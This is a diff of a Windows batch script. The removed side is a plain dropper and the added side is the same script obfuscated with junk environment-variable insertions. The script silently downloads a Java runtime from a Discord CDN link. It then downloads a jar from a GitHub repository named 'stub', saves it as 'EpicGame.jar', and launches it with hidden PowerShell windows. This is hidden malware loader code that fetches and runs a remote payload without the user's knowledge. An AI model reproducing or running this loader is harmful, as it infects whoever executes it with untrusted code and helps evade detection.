@@ -1,39 +1,39 @@
-@echo off
+@%lN%e%zBk%c%zwutGaCAnm%h%Mxwcb%o%yO% %Mgpy%o%sHFDNC%f%mbK%f%PpcDwx%
 
-chcp 65001 >nul
+c%Srys%h%MLR%c%SmhYLbH%p%WZCmAK% %g%6%tJ%5%eLJILkaS%0%HZINAicNz%0%rGxyjg%1%G% %ObloCFt%>%KMGGAZqQTc%n%GhaWWVyBUU%u%xBBC%l%XjQonciWTw%
 
-java -version >nul 2>&1
-if %errorLevel% NEQ 0 (
-    goto :install_java
-) else (
-    goto :download_and_run_jar
-)
+j%YsNIwS%a%cRLNYA%v%EGI%a%Wzk% %OkKFrTyL%-%cDiwr%v%rRYblNS%e%QhCYVPxQoC%r%SIc%s%cXLJTnkHpN%i%jUEjbfAa%o%rZmAO%n%Ai% %KasGLSswi%>%NQaLfe%n%zIGYeUHm%u%fUIQeO%l%VVsCfcgZph% %sz%2%b%>%XFEsYpRbc%&%Ywn%1%IZz%
+i%sbDLCl%f%IVwyUvs% %lhIzGjT%%errorLevel% %yDZNKJaW%N%fkbnTrwWZq%E%rhFemoNHkE%Q%eukhMCaLov% %loDo%0%NKfqaaKM% %Qs%(%H%
+ %yizlcv% %i% %sSbZdWHYlJ% %GiY%g%nw%o%u%t%YiQEi%o%e% %XcTFBb%:%yigBlEDjRW%i%DX%n%Gnr%s%TlCMDpyYO%t%PI%a%yxYYiOpE%l%C%l%pN%_%vThWJuBWpC%j%ZD%a%MVbHH%v%HNy%a%CBEcmeMkP%
+)%DKAWTJ% %IpHvEGg%e%OZdReTFfOa%l%xN%s%FgfExEi%e%NRll% %VITbPw%(%H%
+ %is% %EptAyY% %SPkDdVr% %zd%g%EXFgklRZlC%o%RDAE%t%NwZ%o%wupdVlgKW% %ijFXbpwK%:%MSNlYmcSu%d%tmyQ%o%BZeiQre%w%o%n%IYAyB%l%rQrWq%o%ucGvqG%a%eJodzhp%d%qsjrFS%_%AMYvRH%a%pqfI%n%sHTSU%d%YnWBtJoE%_%WVdEIUKqt%r%lhc%u%NbTSI%n%HaUcNhCihV%_%PzttP%j%PQbyrhoY%a%npgcgNeO%r%HPQzhVa%
+)%EC%
 
-:install_java
-set "url=https://cdn.discordapp.com/attachments/129042639"1"392686080/1293633"1"89289394196/jre1.8.0_361.zip?ex=6708154a&is=6706c3ca&hm=c85af7a9d1b522cc8d680aeb7ffc5204f6110b50058bba2b42f0679f54f4f0e7"
-set "output=%TEMP%\jre1.8.0_361.zip"
-set "installDir=%USERPROFILE%\Java\jre1.8.0_361"
+:%TjsiEgae%i%l%n%ysAxW%s%eVnYO%t%wBWmNmSk%a%fkyrbIPA%l%f%l%QSV%_%AKyxxKbNz%j%RMdqZsKXqu%a%oDPMRbjTwL%v%bamSP%a%iyMUvulrK%
+s%LAlyCBiEpd%e%Yt%t%N% %MYsebaIa%"%MgwQqbngW%u%mKyjI%r%funu%l%gJszTLG%=%Xy%h%yJat%t%iJ%t%zpvVLgtRP%p%pZacb%s%zMn%:%Q%/%xUfVY%/%dVyc%c%wD%d%riVlbj%n%Zgpd%.%El%d%GkW%i%ifO%s%hBmFeDQT%c%jLNbGxsgO%o%zNjcxrgF%r%nIH%d%l%a%rcv%p%DsbY%p%GPlXO%.%RHGv%c%qmYgnu%o%VKKSD%m%dOdiuaQQ%/%Bf%a%SyJmC%t%pqt%t%xEXcjG%a%RX%c%Fm%h%VS%m%HfMOcxQRo%e%Aqjx%n%yxobAir%t%wv%s%OcgJBgxT%/%Z%1%uJShUGARz%2%TFXArsInXk%9%DhTKrW%0%IDSizB%4%NsZUKp%2%sDRJiup%6%yiH%3%Rl%9%utlNjwYeyy%"%FdWXZ%1%atgspqW%"%PT%3%ZZqF%9%npQki%2%mSv%6%o%8%zS%6%uzKNt%0%FCbgKKHt%8%nmXb%0%pA%/%UFdKe%1%YW%2%GgfyQ%9%PZVbevE%3%bBO%6%ETcqf%3%cyA%3%f%"%EQNBKRsumn%1%voUkCygf%"%M%8%WrYGW%9%aGraL%2%GCgTotYiv%8%Dj%9%Z%3%QmBzr%9%uFo%4%QBGrvfvD%1%lTJc%9%kALX%6%raEyASf%/%ZkjMLtU%j%kNkWRZaKBY%r%dz%e%hruyH%1%s%.%LMZPwyT%8%iRr%.%wEZz%0%JohTKU%_%ya%3%tUwqmaO%6%fXO%1%yZJO%.%gczwIhb%z%gp%i%Lh%p%qOhJRKmPCh%?%OgxZYYBxk%e%GyHcQzxPxH%x%dinQKhh%=%WJIyzMXFPq%6%Xi%7%rKUMrmTVV%0%FLiKZPztKj%8%uP%1%ofJRM%5%xBzLEIQ%4%lVOuVJr%a%AICxfwpcXB%&%KrUQZeDoYR%i%PFIKN%s%qAzyGqGwv%=%JLskQ%6%tjrZ%7%LypFIye%0%fLF%6%iwEW%c%cROvWXZG%3%jrLXwtuHOh%c%BVAZvO%a%bGxe%&%t%h%crvCkSYeZq%m%qBMsPaXEst%=%NiiHw%c%rRIEjDLUQ%8%Ix%5%Ofa%a%KaTdOyrxM%f%irGS%7%ael%a%NIE%9%EW%d%isQp%1%DW%b%RPpSix%5%p%2%yQjAI%2%bij%c%TYe%c%aoQG%8%JEzfRuhfns%d%xdmLFaXnIC%6%oJXxbp%8%clQJUjOQ%0%WxQoGHU%a%bTDGwyHNv%e%kB%b%cGNm%7%qT%f%zT%f%UTbf%c%g%5%J%2%lUJxRpmqC%0%WMRAeGKf%4%haJca%f%A%6%xqRcNyC%1%xcIIlrzPJ%1%JPqzDRbx%0%ot%b%gOtJKVnxKq%5%udNa%0%GAoRtBmfW%0%IDLMQhO%5%DZlzqvs%8%UVQMx%b%xhFBeyrjN%b%fdwkylLD%a%BlRDlqD%2%LNn%b%YZGNnoZDHD%4%VUhU%2%IiNt%f%mFpseUiR%0%bJbhGZ%6%SCh%7%CxxUgqcRvH%9%og%f%sxyDFbePEd%5%WQMXRc%4%GFog%f%ymXjZmx%4%F%f%kLrgl%0%f%e%jXFKCxWmUz%7%xmjlOgCD%"%WJnzpVw%
+s%qDcZOjTNnd%e%LbisYj%t%cgEY% %DCIlbh%"%CRRNuubc%o%dBN%u%ETxivO%t%JlHkEoalc%p%ANjZ%u%As%t%RnUqOPYM%=%GemOHqWi%%TEMP%\%kRhx%j%pAMaDFEP%r%cYSGBKl%e%nbccHtMk%1%vjIuLD%.%qJTegwm%8%bUooMpyP%.%zyZxdfhAL%0%Rylf%_%wrKGvGmIRe%3%P%6%fCKAPUk%1%nZZtFVrOuX%.%KJTE%z%aH%i%FFC%p%gxVw%"%utKKL%
+s%DnNClfT%e%dSbzGlfKm%t%HTypKUMNy% %FpLKrWjd%"%d%i%GLIJFiq%n%RxZIF%s%VZpJbu%t%SMbU%a%GkzIAXjk%l%ZdD%l%UtNFirl%D%TbBNtfKP%i%wcO%r%kxx%=%eA%%USERPROFILE%\%qTEian%J%rxpozP%a%tEaytmrlk%v%X%a%UQq%\%ZxFM%j%Snq%r%OAJ%e%VjeESAGYP%1%JhM%.%Oyxf%8%fBXpL%.%dop%0%alUQqwZH%_%wrHgRCcSnf%3%xZpBzRU%6%jTaokfGEYE%1%s%"%sJmfPwfzMz%
 
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%output%')"
+p%JKdNZyYxaF%o%JIvR%w%bCbTMjR%e%yykJnzPGlV%r%pVvPf%s%pseLTUb%h%FOaCVPxq%e%B%l%YPG%l%RltdummICZ% %sNaQuINzH%-%kHdP%W%xpcJUmuZ%i%setUKg%n%BfDKE%d%PtZAiFo%o%Dt%w%fupBD%S%SSnSlDzg%t%SqSlXCsJt%y%HES%l%KudHqeNj%e%bBk% %e%H%j%i%fc%d%qkag%d%SzelsTu%e%VPmlPKeKQ%n%y% %NvLF%-%ETBEslKVW%C%iUIF%o%ObEexcOEGr%m%HclzgZvc%m%YBCbOWYJCC%a%WB%n%FabGOgopOk%d%zIKZaMUCc% %ijL%"%Xe%(%CpoQ%N%ijjVXi%e%MCTNYtY%w%eUEcEOhVN%-%dNZsjOaViq%O%IHuqoKI%b%VlrpI%j%hpYbgWgeg%e%LXMXoQRD%c%xXrbypfl%t%F% %JUsTfiuN%S%Jp%y%liFXmD%s%EEtOsqnmoY%t%JsFGX%e%iGPvLUU%m%RjzkKDdxdM%.%mRl%N%cHTNkUY%e%oRJ%t%vSJdxq%.%RRe%W%t%e%gLgJ%b%IJ%C%PEXvoOjg%l%KIuamA%i%DYZY%e%UXrHQ%n%H%t%IgeO%)%htbQ%.%wXl%D%rz%o%jDgjIFUAFx%w%aKLBPP%n%pTxE%l%W%o%xVNPbctxV%a%n%d%euT%F%NnYVXkPJ%i%ICHOUzJdo%l%Ccat%e%jILIJl%(%f%'%G%%url%'%bK%,%BPqX% %UZ%'%kl%%output%'%PlO%)%UjPUtpGrlC%"%QbKlhYOKu%
 
-powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"
+p%Wgw%o%iDIWqM%w%EwO%e%NrLldLaUnU%r%KgDdd%s%YzQK%h%Ss%e%XQmGOtJ%l%wNOXHCv%l%BYCZmGsGY% %h%-%dbNBFt%W%Fg%i%ZqpaKQO%n%kp%d%nMaORWqz%o%fJLQMY%w%buJPvQIg%S%coLjjdvN%t%PkYEfABkYz%y%vmeseEIGKo%l%ghPwk%e%MH% %YmtmOXDr%H%i%i%IvdBXXJN%d%T%d%LJaEM%e%rCPnt%n%OsRaIGtEL% %PumNHYkV%-%bqwhzfmZ%C%T%o%d%m%ZfQZgS%m%jpFRqXT%a%T%n%RGZ%d%z% %VZK%"%IbJ%E%PiaHTjAT%x%UIkB%p%A%a%ldywsJXq%n%sWMVjekv%d%eBAegkmNut%-%RcfkXojHcN%A%SR%r%VtmtpxveBW%c%VLJXi%h%rYmkr%i%vYdpwkqp%v%micJAqktY%e%Xfx% %iRkv%-%zuFAKHcv%P%zsPe%a%gsTVMBJRko%t%kBJTkLSOU%h%dUv% %lUirRhOm%'%pDeqAVfBLy%%output%'%YCcrpepT% %rpg%-%GpJbKN%D%GKJsPUJf%e%nAQRq%s%CCfErgVbH%t%GZ%i%skfs%n%FXUkxTFJs%a%EdHFrNbmi%t%izc%i%jgVUzLJU%o%CyBVZJ%n%swygnu%P%h%a%TyKEANI%t%gF%h%Erv% %doAmKGJBAn%'%bfeZd%%installDir%'%sEobk%"%KXaIT%
 
-if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
-    del "%output%"
-) else (
-    exit /b 1
-)
+i%nffRmEtPeI%f%HxsWh% %xnWm%e%iDc%x%poNKRQciqY%i%FaakqRR%s%iuDm%t%qkiDCRI% %vvQt%"%swFjAFpq%%installDir%\%rhqaA%j%exUJmodtm%r%luNV%e%o%1%wdqDK%.%nXYmDTpKF%8%vgajvLuWy%.%trtfSa%0%YxfA%_%fZDgWIVWzN%3%UHXV%6%pIDTvZD%1%DUXQplhl%\%hKdmdn%b%ycsTQKrso%i%sexJXf%n%prFm%\%mYpjeAuWxQ%j%xjRgABHZLo%a%yevHAHYRY%v%tBOeI%a%kma%.%traD%e%ayMLuTwAOm%x%SexG%e%ThajiKu%"%vMSx% %HJJpWZiXb%(%ZXCi%
+ %lThXuRgPK% %C% %pmJMt% %lazpr%d%ASw%e%rwD%l%EIw% %hgpTlXQ%"%CAerfVXpf%%output%"%mX%
+)%yIXPUdM% %jiaXnXYV%e%UacLfhX%l%h%s%NbBZUi%e%f% %UqMkYqwD%(%dM%
+ %kzegCCtYv% %HDRrfXJgE% %UEDJYHXQY% %AJRLZoCITc%e%gzMSpUC%x%FEUXQ%i%VYrYOd%t%BmN% %kSrHLvMd%/%HvMLyw%b%GhuMgPQW% %UNDrk%1%tgihhODvJ%
+)%MT%
 
-set PATH=%PATH%;%installDir%\jre1.8.0_361\bin
+s%PcH%e%BD%t%oW% %LwVIGE%P%jbYxwb%A%QUXJBxJe%T%MHoS%H%Fof%=%KRFLWMaVJS%%PATH%;%HkTijKqB%%installDir%\%mUXKrSoQ%j%bku%r%lyPaiok%e%FZdlLnf%1%vlD%.%qVtEGnaLS%8%uToRSG%.%MPCj%0%Vcz%_%RgV%3%xwObi%6%fwCht%1%IZgexw%\%l%b%zChM%i%aVloEsr%n%ISWbDt%
 
-:download_and_run_jar
-set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/Ja"v"a.jar"
-set "jarOutput=%TEMP%\Ep"i"cGame.jar"
+:%BQXJVOOs%d%gCv%o%KdcYxfBTZS%w%EoHj%n%SMEV%l%eRbiZYZ%o%Km%a%E%d%rgLB%_%T%a%pQPvG%n%A%d%Ei%_%UusPpIFv%r%HOxDDrad%u%YJqsKHrZ%n%fJ%_%Q%j%xSmSD%a%cWj%r%PKFkkmr%
+s%CBkAGb%e%qjM%t%PE% %dIfCOGr%"%JxmaBiqDo%j%ddw%a%k%r%ajBpnNBOR%U%MiKOovd%r%gz%l%LkbYQ%=%BjqkM%h%mBARpYF%t%C%t%xkYPK%p%s%s%OSocarBLmx%:%wtdDdNiZJ%/%Xi%/%Adn%g%xmSAclIN%i%DOrv%t%kryKMB%h%pwYfQPDd%u%UIg%b%Lbw%.%zgyAULpH%c%hQYQW%o%EHVTiac%m%lfQY%/%qC%P%rJKaSw%y%uxXi%t%VNRtFr%h%Xj%o%inDROoRkU%n%pH%-%A%i%yCtcq%s%wwReFnvJT%-%UTgC%t%SzCzJxsi%r%S%a%oemSAr%s%rvnJVckONF%h%Rabki%/%emSwIyT%s%dvBoiKWUPf%t%ICVdYkH%u%QLlR%b%FQoPLpn%/%neqUi%r%ijfpXghG%a%XqIod%w%eFB%/%kYFP%r%S%e%sYKLtvPeEV%f%MJYgoZlu%s%TKu%/%sQ%h%AtXbEbFY%e%tYoljsx%a%Mswa%d%enz%s%NzcZXTlTpn%/%g%m%MGlzMlyBjV%a%bT%i%StSkSxgY%n%h%/%qQohnGKu%J%DZLLIFAF%a%HPSION%"%dSkbK%v%uI%"%bR%a%gFc%.%xfWcQtMNm%j%XlC%a%cEMLFMs%r%nusjWYQ%"%pBH%
+s%NiXafvDM%e%iKsCjGeo%t%UVMfpXCE% %ZWPXSu%"%ywE%j%x%a%zFBRXqX%r%SPDnN%O%plndMno%u%WhQMDxsODE%t%IJsXpjVS%p%okXAKi%u%GGRGKYVHq%t%rFba%=%i%%TEMP%\%Lr%E%mluM%p%pHdBgGPXSj%"%Fmv%i%mdSzcs%"%tCyazgaBl%c%zzgBsNHEJ%G%dA%a%lTzIbr%m%lFOln%e%biyxPG%.%uBnSLXIMvc%j%XKPLCqftx%a%EEGSIPceH%r%LKArmR%"%fBXl%
 
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"
+p%Yhkxg%o%Gum%w%SRmtWzHj%e%L%r%NgQaBIZRr%s%BZtET%h%qR%e%SyFsEOMVf%l%xNisAiFky%l%uz% %MtXUKRp%-%PON%W%FYJMeCYcj%i%OVmWWIEUqh%n%jo%d%kimFec%o%LVy%w%eHGn%S%NaTxZOhjtS%t%VuwLzhyG%y%ElNJpWd%l%BzCgHeaoD%e%YHdjGnUdii% %cWv%H%dNLxGKbOgm%i%kyHImoopo%d%nooK%d%ROnMH%e%SEna%n%cutTJ% %r%-%o%C%KUulpQcUmv%o%PmfFiLXBoW%m%a%m%if%a%FXgbKQYf%n%IyvlLhjsJ%d%GpUz% %UGqO%"%R%(%bfRMdFYsgs%N%aqv%e%gKrsQ%w%sXxIHVMS%-%JVBD%O%XRPxpXMtnQ%b%TrgwFSxug%j%Sirxzckef%e%blHUdBE%c%RwMe%t%LMbuUcCtjs% %vlOxtC%S%Y%y%ULWjy%s%UTX%t%RCeSmvMeML%e%mKpzrnVOvM%m%FCqTfmpHN%.%mBearNQUYS%N%RdN%e%L%t%mtLCo%.%TtcNXz%W%lY%e%nCBZMx%b%XYqCdxr%C%FPN%l%uimVvgcd%i%SOcFdz%e%kwR%n%GrjkSZT%t%I%)%NqAstoywTi%.%s%D%mpobkxyLW%o%RcGK%w%nbPRPmnF%n%vkcrtk%l%vZJQJb%o%XZjalC%a%thjF%d%Lc%F%mSUBq%i%FsGGjHoNqZ%l%XZdiCPhAs%e%wptOcoXdh%(%v%'%r%%jarUrl%'%jAhsA%,%GnDFs% %zeT%'%LfJXPjQjpm%%jarOutput%'%pAmHgrSrwm%)%FEONRzaJo%"%E%
 
-if exist "%jarOutput%" (
-    powershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
-)
+i%JRZKD%f%jYDfd% %fzGKR%e%umFBVaCFBi%x%utiYNyUfUY%i%nO%s%JSzl%t%ThRne% %YJAvgJL%"%ktxImcdxX%%jarOutput%"%BHrJNd% %sswNN%(%y%
+ %VRmlaZw% %HjDvJ% %HMIe% %qnMumCO%p%fjW%o%aedlEJf%w%ufHn%e%HHhLmnjq%r%VbDTD%s%qDsUaxXk%h%KXyioPsH%e%KzIqRaQJzd%l%bfsi%l%iskSlDdJki% %bRb%-%ve%W%tBI%i%r%n%L%d%ApsCxedwsF%o%uxxGhFMMTE%w%eEGkRyvlir%S%jQn%t%Cwfe%y%dtsTtfrBPa%l%ggnm%e%ydehoHIpYN% %za%H%qxcLZLTf%i%E%d%Qwl%d%kXaNrgn%e%MxAsYUswME%n%V% %tShlzjq%-%hdLU%C%qgXKMVmJ%o%TN%m%g%m%GRXp%a%TrGLzi%n%e%d%NFxC% %Sl%"%wW%S%wn%t%HZeTBztsG%a%DWXKhjpNIP%r%yYK%t%GB%-%javV%P%wpPUwxAhAR%r%jV%o%PZYuFtB%c%sgYo%e%aIvpN%s%tbMoz%s%xMBl% %JTAx%'%deQgYx%j%FfKBFTYxGV%a%pLBUecR%v%eYwCBIEWzX%a%ZVkKxFM%'%VfTGh% %ezWaQV%-%DjPl%A%eJAaRJDNmg%r%TgDgR%g%NUrAYPx%u%YWKQEsrW%m%hbJWmypQJ%e%x%n%EyTAO%t%mcUqorHisp%L%nLKyqux%i%DtjRX%s%NUIVyEMV%t%ruqOsDIP% %wvaEZm%'%QP%-%k%j%HsGzbMNk%a%rOX%r%oJRutZ%'%pahDb%,%otvWcAw% %ZqLTZId%'%lJlD%%jarOutput%'%nFKOvEn% %vLnwtEZHNt%-%oLEuHerS%W%cIe%i%zWKlzpyiFH%n%uiEwTlHTn%d%QouyvP%o%cOZne%w%TgXxFChnB%S%YlNnP%t%vhxqnN%y%btCjWt%l%Kyab%e%WnVR% %vRWh%H%zIkuSQbjor%i%lvvDo%d%xmzPLtNVXG%d%T%e%UScj%n%CKrG%"%RADXhAC%
+)%SKWQV%
 
-exit
+e%uV%x%vicS%i%ormR%t%bfjiowiFq%
